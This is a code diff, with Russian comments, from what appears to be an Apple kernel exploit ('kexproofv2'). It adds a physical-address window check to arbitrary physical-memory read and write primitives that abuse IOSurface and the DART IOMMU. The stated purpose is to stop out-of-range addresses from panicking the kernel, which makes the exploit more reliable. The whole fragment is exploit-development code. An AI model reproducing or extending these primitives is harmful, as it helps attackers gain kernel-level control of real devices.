@@ -152,9 +152,30 @@ static uint64_t kpZoneVtoP(uint64_t va)
 // backing ленивый — rdPA=0 в 255-260 = оп молча дропался), свежий pipe, патч ВСЕХ
 // записей rd-буфера на targetPA>>14 ДО первого submit (первый map = сериализация из
 // record buffer). Rect {0,0,1024,4} = полные 16KB сплошь (stride 0x1000).
+
+// kexproofv2 2.0.4: DART-окно физически не покрывает низкие PA. Рабочие
+// замеры: ≥0x10043a00000 (rdPA) читаются; PT-страницы ~0x1000bxxxxx дают
+// sentinel 0x5A (буфер не обновился), а их physwrite улетает в DVA 0 →
+// паника AppleT8110DART ("CTE invalid ... DVA 0"). Пол: physBase+1GB.
+// Потолок: physBase+physSize. Вне окна — НЕ трогаем DART вообще.
+static BOOL kpDartPAInWindow(uint64_t pa, NSMutableString *r, const char *tag)
+{
+    uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
+    if (!pS) return NO;
+    uint64_t lo = pB + 0x40000000ULL;   // 1GB — ниже лежат PT/TTBR-кадры, окно мимо
+    uint64_t hi = pB + pS;
+    if (pa < lo || pa >= hi) {
+        kpNote(r, [NSString stringWithFormat:@"  [DART-GATE] %s PA=%#llx вне окна [%#llx..%#llx) — пропуск (иначе DVA 0 / 0x5A-sentinel)",
+                  tag, (unsigned long long)pa, (unsigned long long)lo, (unsigned long long)hi]);
+        return NO;
+    }
+    return YES;
+}
+
 static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
                           uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
+    if (!kpDartPAInWindow(targetPA & ~0x3fffULL, r, "physread16k")) { memset(out, 0, 0x4000); return NO; }
     memset(out, 0, 0x4000);
     NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @16,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
@@ -277,6 +298,7 @@ static void *kpEvictWorker(void *arg)
 static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
                            uint64_t targetPA, uint32_t boff, uint64_t payload, NSMutableString *r)
 {
+    if (!kpDartPAInWindow(targetPA & ~0x3fffULL, r, "physwrite8")) return NO;
     NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
     IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
